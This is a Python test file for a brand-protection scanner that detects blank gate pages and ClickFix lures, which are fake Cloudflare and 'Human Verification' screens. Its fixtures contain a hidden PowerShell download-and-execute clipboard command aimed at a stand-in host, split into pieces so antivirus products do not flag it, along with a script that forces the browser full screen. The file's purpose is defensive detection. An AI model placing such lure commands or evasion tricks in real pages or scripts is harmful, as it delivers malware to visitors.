"""A blank page is not a screenshot; and a fake "human verification" that makes the visitor run a command is malware delivery.

1. cryptohopper-app.com redirected through a tracking link (qemow.com/go/…?subid1=…): a gate that shows nothing to a scanner. The
   screenshot was one white rectangle, compared with the brand's homepage as if it meant something. Now a blank picture is
   recognised; urlscan.io is asked for one that shows something; when there is none, the finding says where the visit ended up, and
   when it knows nothing else, that there is no screenshot.
2. The same chain ends on a fake Cloudflare "I'm not a robot" and then a "Human Verification" that says Win+R, Ctrl+V, Enter and locks
   the screen full size (ClickFix). It is recognised from the page text and scripts, and rated High at least. The test fixtures put
   the payload together from pieces: the sentence in one piece is what antivirus products detect (one of them did, on a command line).
"""

from __future__ import annotations

import asyncio
import dataclasses
import io
import uuid

import sqlalchemy as sa
from fastapi.testclient import TestClient
from PIL import Image
from tests.conftest import make_brand, make_workspace
from tests.test_demo_story import _api, _app, _ui

import brandwatch.db.models as m
from brandwatch.config.brand_config import DEFAULT_COMBINATION_RULES, SIGNAL_GROUPS, ScoringConfig
from brandwatch.config.settings import Settings
from brandwatch.db.enums import EvidenceType
from brandwatch.detection import images
from brandwatch.detection.discovery import manual_hits
from brandwatch.detection.html import clickfix_lure
from brandwatch.detection.runner import run_scan
from brandwatch.providers.mock.fixtures import default_store

SHELL = "pow" + "ershell"  # never as one word: security products read that, with the rest of a lure, as the lure
RUN_STEPS = "<ol><li>Win + R</li><li>Type cmd in the input box and press Enter</li><li>Ctrl + V</li><li>Enter</li></ol>"


def _stage_one(ray="v13mjcggvch28y8o", named="cloudflare.com"):
    return (f'<html><head><title>Just a moment...</title></head><body><h1>{named}</h1><div><input type="checkbox"> I\'m not a robot Cloudflare Privacy - Terms</div>'
            f"<p>{named} needs to review the security of your connection before proceeding.</p><footer>Ray ID: {ray}</footer></body></html>")


def _stage_two(extra_script=""):
    return ("<html><head><title>Human Verification</title></head><body><h2>Human Verification</h2><p>Complete the steps below</p>"
            f"{RUN_STEPS}<p>Verification ID: 667348634142</p><script>{extra_script}</script></body></html>")


class _Scenarios:
    def __init__(self, *rows):
        self.rows, self.store = rows, default_store()

    def __enter__(self):
        for host, base, http, extra in self.rows:
            sc = self.store.get(base)
            self.store._by_host[host] = dataclasses.replace(sc, host=host, url=f"https://{host}/", http={**sc.http, **http}, **extra)  # fmt: skip
        return self

    def __exit__(self, *exc):
        for host, *_ in self.rows:
            self.store._by_host.pop(host, None)


def _png(color, size=(300, 200), box=None):
    im = Image.new("RGB", size, color)
    if box:
        im.paste((20, 20, 20), box)
    out = io.BytesIO()
    im.save(out, format="PNG")
    return out.getvalue()


# ------------------------------------------------------------------------------------------ a blank picture
def test_a_flat_picture_is_blank_and_a_page_with_content_is_not():
    assert images.is_blank(_png("white")) and images.is_blank(_png((12, 12, 12)))  # one colour, light or dark
    assert not images.is_blank(_png("white", box=(40, 40, 260, 160)))  # a real layout
    assert not images.is_blank(_png("white", box=(10, 10, 60, 40)))  # a small logo on white is still a page
    assert not images.is_blank(None) and not images.is_blank(b"not an image")  # unreadable is not "blank"


# ------------------------------------------------------------------------------------------ ClickFix
def test_the_fake_cloudflare_check_and_the_run_a_command_screen_are_recognised():
    one = clickfix_lure("Just a moment...", _stage_one(), "tv4q.roachtraffic.cc")
    assert one["kind"] == "fake_cloudflare" and "cloudflare.com needs to review" in one["indicators"][0] and "tv4q.roachtraffic.cc" in one["indicators"][0]
    two = clickfix_lure("Human Verification", _stage_two(), "tv4q.roachtraffic.cc")
    assert two["kind"] == "instructions" and "Win+R" in two["indicators"][0]
    copy = f'navigator.clipboard.writeText("{SHELL} -w hidden " + "i" + "ex (irm http://x)");document.documentElement.requestFullscreen()'
    full = clickfix_lure("Human Verification", _stage_two(copy), "tv4q.roachtraffic.cc")
    assert [i.split(" ")[0] for i in full["indicators"]] == ["its", "a", "it"]  # steps, clipboard command, forced full screen
    assert "full screen" in full["indicators"][-1]
    decoded = clickfix_lure("Verify", "<p>Verify you are human</p><script>navigator.clipboard.writeText(atob('SGVsbG8='))</script>", "x.example")
    assert decoded["kind"] == "clipboard"  # the command is hidden in a string that is decoded on the fly


def test_pages_that_merely_talk_about_it_are_left_alone():
    article = "<html><body>" + "<p>To open the Run dialog press Win + R, type cmd and press Enter, then paste with Ctrl + V.</p>" * 200 + "</body></html>"
    assert clickfix_lure("Windows tips", article, "blog.example") is None  # a how-to article is long and has no verification screen
    login = '<form><input type="password"></form><p>Protected by captcha.</p><script>var m = {captchaFailed: "x"}</script>'
    assert clickfix_lure("Sign in", login, "bank.example") is None
    real = ('<html><head><title>Just a moment...</title></head><body><h1>shop.example</h1><p>shop.example needs to review the security of your '
            "connection before proceeding.</p><p>Verify you are human</p><footer>Ray ID: 8c1f2a3b4d5e6f70</footer></body></html>")
    assert clickfix_lure("Just a moment...", real, "shop.example") is None  # the genuine check names the site it protects, with a real Ray ID
    assert clickfix_lure(None, None, None) is None
    assert clickfix_lure("x", _stage_one(ray="8c1f2a3b4d5e6f70", named="www.shop.example"), "shop.example") is None


def test_the_lure_is_a_signal_with_a_rule_and_old_configs_gain_it():
    assert SIGNAL_GROUPS["clickfix_lure"] == "behavior"
    assert any(r.name == "clickfix_lure_verdict" and r.signals_all == ["clickfix_lure"] for r in DEFAULT_COMBINATION_RULES)
    saved = ScoringConfig().model_dump(mode="json")
    saved["version"] = "v5"
    saved["weights"].pop("clickfix_lure")
    saved["combination_rules"] = [r for r in saved["combination_rules"] if r["name"] != "clickfix_lure_verdict"]
    up = ScoringConfig.model_validate(saved)
    assert up.weights["clickfix_lure"] == 30 and any(r.name == "clickfix_lure_verdict" for r in up.combination_rules) and up.version.endswith("+c7")


# ------------------------------------------------------------------------------------------ the scans
def _scan(engine, tmp_path, urls, *, official="shopnova.com"):
    from brandwatch.db.base import make_session_factory

    settings = Settings(_env_file=None, demo_mode=True, evidence_dir=str(tmp_path / f"ev-{uuid.uuid4().hex[:6]}"))
    with make_session_factory(engine)() as s:
        ws = make_workspace(s, f"bl-{uuid.uuid4().hex[:6]}")
        b = make_brand(s, ws, "ShopNova")
        s.add(m.BrandDomain(brand_id=b.id, domain=official, is_official=True, kind="official"))
        job = m.ScanJob(workspace_id=ws.id, brand_id=b.id, kind="url_scan")
        s.add(job)
        s.flush()
        summary = asyncio.run(run_scan(s, job.id, settings=settings, hits=manual_hits(urls)))
        s.commit()
        events = s.scalars(sa.select(m.ScanEventRecord).where(m.ScanEventRecord.job_id == job.id).order_by(m.ScanEventRecord.seq)).all()
        out = {}
        for cand in s.scalars(sa.select(m.Candidate).where(m.Candidate.brand_id == b.id)).all():
            f = s.scalars(sa.select(m.Finding).where(m.Finding.candidate_id == cand.id)).first()
            cur = f.current_score if f else None
            shots = s.scalars(sa.select(m.Evidence).where(m.Evidence.candidate_id == cand.id, m.Evidence.type == EvidenceType.SCREENSHOT)).all()
            out[cand.canonical_domain] = {
                "cand": cand, "finding": f, "signals": dict(cur.signals or {}) if cur else {},
                "severity": cur.severity.value if cur else None,
                "shots": [(e.source, e.source_type, bool((e.response_meta or {}).get("blank"))) for e in shots],
            }  # fmt: skip
        return summary, events, out


def test_a_blank_page_takes_the_picture_from_urlscan_when_it_has_one(engine, tmp_path):
    with _Scenarios(("shopnova-gate.com", "shopn0va.com", {"blank_for": ["*"]}, {"cloak": {}})):
        summary, events, out = _scan(engine, tmp_path, ["https://shopnova-gate.com/"])
    o = out["shopnova-gate.com"]
    sig = o["signals"]
    assert ("playwright", "screenshot", True) in [(s.split(":")[-1] if ":" in s else s, t, b) for s, t, b in o["shots"]] or any(b for *_x, b in o["shots"])
    assert ("urlscan", "urlscan_snapshot", False) in o["shots"]  # the picture on file that is compared is urlscan.io's
    snap = sig["_snapshot"]
    assert snap["reason"] == "blank" and snap["scan_id"] == "mock-pic-shopnova-gate.com" and snap["via"] == "a scan of the site itself"
    assert "_no_picture" not in sig and "screenshot" not in sig["_unavailable"]
    said = [e.message for e in events if e.stage == "enrichment"]
    assert any(x.startswith("shopnova-gate.com showed a blank page — using the urlscan.io picture of") for x in said), said


def test_a_blank_page_nobody_has_a_picture_of_says_where_it_leads(engine, tmp_path):
    hops = ["https://qemow.example/go/3115960?subid1=shopnova-gate2.com"]
    with _Scenarios(("shopnova-gate2.com", "shopn0va.com",
                     {"blank_for": ["*"], "no_snapshot": True, "hops": hops, "final_url": "https://qemow.example/go/3115960?subid1=shopnova-gate2.com&tm"}, {"cloak": {}})):
        summary, events, out = _scan(engine, tmp_path, ["https://shopnova-gate2.com/"])
    o = out["shopnova-gate2.com"]
    sig = o["signals"]
    assert o["finding"] is not None
    np_ = sig["_no_picture"]
    assert np_["final_url"].endswith("&tm") and np_["chain"] == ["https://shopnova-gate2.com/", hops[0]] and "no picture of it either" in np_["why"]
    assert "screenshot" in sig["_unavailable"] and "_snapshot" not in sig
    assert not any(k.startswith("screenshot_similarity") for k in sig)  # a white rectangle is not compared with the brand
    said = [e.message for e in events if e.stage == "enrichment"]
    assert any("shopnova-gate2.com showed a blank page — no screenshot; it leads to https://qemow.example/go/3115960" in x for x in said), said
    step = next(st for st in summary.steps if "showed a blank page" in st["title"])
    assert step["items"][0]["label"] == "shopnova-gate2.com" and "qemow.example" in step["items"][0]["tag"]


def test_the_finding_page_says_so(engine, tmp_path):
    app = _app(engine, tmp_path)
    with _Scenarios(
        ("shopnova-gate3.com", "shopn0va.com", {"blank_for": ["*"], "no_snapshot": True, "hops": ["https://tds.example/go/1"], "final_url": "https://tds.example/go/1?x=2"}, {"cloak": {}}),
        ("shopnova-gate4.com", "shopn0va.com", {"blank_for": ["*"]}, {"cloak": {}}),
    ), TestClient(app):
        c, ui = _api(app), _ui(app)
        brand = c.post("/api/brands", json={"name": f"Gate {uuid.uuid4().hex[:4]}", "domains": ["shopnova.com"]}).json()
        job = c.post(f"/api/brands/{brand['id']}/scan-urls", json={"urls": ["https://shopnova-gate3.com/", "https://shopnova-gate4.com/"]}).json()["job_id"]
        app.state.queue.wait(uuid.UUID(job), timeout=120)
        rows = {(f.get("hostname") or f.get("host")): f for f in c.get("/api/findings", params={"brand_id": brand["id"]}).json()}
        none, urlscan = rows["shopnova-gate3.com"], rows["shopnova-gate4.com"]
        d = c.get(f"/api/findings/{none['id']}").json()
        assert d["screenshots"]["suspect_url"] is None and d["score"]["no_picture"]["final_url"] == "https://tds.example/go/1?x=2"
        page = ui.get(f"/ui/findings/{none['id']}").text
        assert 'id="no-picture"' in page and "No screenshot: the page is blank." in page and "https://tds.example/go/1?x=2" in page
        assert "Where the visit ended up" in page and "decides who gets the real page" in page
        d2 = c.get(f"/api/findings/{urlscan['id']}").json()
        assert d2["screenshots"]["suspect_url"] and d2["score"]["snapshot"]["reason"] == "blank"
        page2 = ui.get(f"/ui/findings/{urlscan['id']}").text
        assert "This picture is from urlscan.io, not what BrandWatch saw." in page2 and "blank (one flat colour)" in page2


def test_a_destination_that_is_a_clickfix_lure_is_flagged_with_the_site_that_sends_visitors_there(engine, tmp_path):
    with _Scenarios(
        ("shopnova-promo9.net", "shopn0va.com", {"location": "https://tv4q.roachtraffic.net/"}, {}),
        ("tv4q.roachtraffic.net", "shopnova-login.com", {"html": _stage_one()}, {"favicon": None, "screenshot": "other"}),
    ):
        summary, events, out = _scan(engine, tmp_path, ["https://shopnova-promo9.net/"])
    assert "roachtraffic.net" in out, (list(out), out["shopnova-promo9.net"]["severity"], out["shopnova-promo9.net"]["signals"], [e.message for e in events if "redirect" in e.message])
    a, b = out["shopnova-promo9.net"], out["roachtraffic.net"]
    assert "clickfix_lure" in a["signals"] and a["severity"] in ("high", "critical")  # the visit landed on the lure: rated for it
    assert b["finding"] is not None and "clickfix_lure" in b["signals"] and "redirect_from_suspect" in b["signals"]  # not brand-related, taken because of the lure
    assert b["signals"]["_clickfix"]["kind"] == "fake_cloudflare" and b["severity"] in ("high", "critical")
    assert any("tries to make the visitor run a command" in (e.message + str(e.data)) for e in events)
    step = next(st for st in summary.steps if "tried to make the visitor run a command" in st["title"])
    assert {i["label"] for i in step["items"]} >= {"tv4q.roachtraffic.net"}


def test_the_finding_page_warns_about_the_lure(engine, tmp_path):
    app = _app(engine, tmp_path)
    with _Scenarios(("shopnova-lure.com", "shopn0va.com", {"html": _stage_two(f'navigator.clipboard.writeText("{SHELL} -w hidden x");document.body.requestFullscreen()')}, {"cloak": {}})), TestClient(app):
        c, ui = _api(app), _ui(app)
        brand = c.post("/api/brands", json={"name": f"Lure {uuid.uuid4().hex[:4]}", "domains": ["shopnova.com"]}).json()
        job = c.post(f"/api/brands/{brand['id']}/scan-urls", json={"urls": ["https://shopnova-lure.com/"]}).json()["job_id"]
        app.state.queue.wait(uuid.UUID(job), timeout=120)
        f = c.get("/api/findings", params={"brand_id": brand["id"]}).json()[0]
        d = c.get(f"/api/findings/{f['id']}").json()
        assert d["finding"]["severity"] in ("high", "critical") and d["score"]["clickfix"]["kind"] == "instructions"
        page = ui.get(f"/ui/findings/{f['id']}").text
        assert 'id="clickfix"' in page and "This page tries to make the visitor run a command (ClickFix)." in page
        assert "never clicked, copied or ran anything" in page and "forces the browser full screen" in page


# ------------------------------------------------------------------------------------------ the real browser follows a gate
def test_the_sandboxed_browser_follows_a_blank_gate_that_forwards_the_visit(monkeypatch):
    import http.server
    import ipaddress
    import socketserver
    import threading

    import pytest
    from tests.test_phase2 import _chromium_available

    from brandwatch.providers.impl import playwright_fetcher as pf

    if not _chromium_available():
        pytest.skip("Playwright Chromium not installed")
    monkeypatch.setattr(pf, "FORWARD_WAIT", 4.0)
    landing = "<html><head><title>Landing</title></head><body>" + "<p>The page the visitor really gets. </p>" * 30 + "</body></html>"

    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a, **k):
            pass

        def do_GET(self):  # noqa: N802 - http.server API
            if self.path.startswith("/gate"):  # nothing to read; a meta refresh sends the visit on after a second
                body = b'<html><head><title>...</title><meta http-equiv="refresh" content="1;url=/landing?tm"></head><body></body></html>'
            elif self.path.startswith("/landing"):
                body = landing.encode()
            else:  # a blank page that never forwards
                body = b"<html><head><title>...</title></head><body></body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    class Srv(socketserver.ThreadingTCPServer):
        allow_reuse_address = True

    srv = Srv(("127.0.0.1", 0), H)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        fetcher = pf.PlaywrightBrowserFetcher(
            resolver=lambda h: [ipaddress.ip_address("93.184.216.34")] if h == "fwd.test" else [],
            launch_args=[f"--host-resolver-rules=MAP fwd.test 127.0.0.1:{port}"],
        )
        d = asyncio.run(fetcher.fetch("http://fwd.test/gate", "datacenter")).data
        assert d["final_url"] == "http://fwd.test/landing?tm" and d["title"] == "Landing" and d["status"] == 200
        assert d["redirect_chain"] == ["http://fwd.test/gate"] and d["client_redirects"] >= 1  # the page forwarded the visit, not HTTP
        assert not images.is_blank(d["screenshot_png"])  # the picture is of the page the visitor lands on
        dead = asyncio.run(fetcher.fetch("http://fwd.test/nothing", "datacenter")).data
        assert dead["final_url"] == "http://fwd.test/nothing" and images.is_blank(dead["screenshot_png"]) and dead["redirect_chain"] == []
    finally:
        srv.shutdown()
